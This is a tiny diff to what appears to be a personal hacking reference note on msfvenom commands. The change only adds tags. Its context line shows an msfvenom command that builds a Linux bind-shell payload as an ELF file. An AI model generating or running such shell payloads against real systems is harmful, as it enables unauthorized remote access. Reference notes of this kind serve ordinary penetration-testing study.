@@ -8,4 +8,4 @@ msfvenom -p linux/x64/shell/bind_tcp LHOST=$LHOST -f elf > rev_shell.elf
 - ~/kb/hacking/commands/msfvenom-commands.md
 
 Tags:
-    #assorted #command
+    #assorted #command #hacking #msfvenom
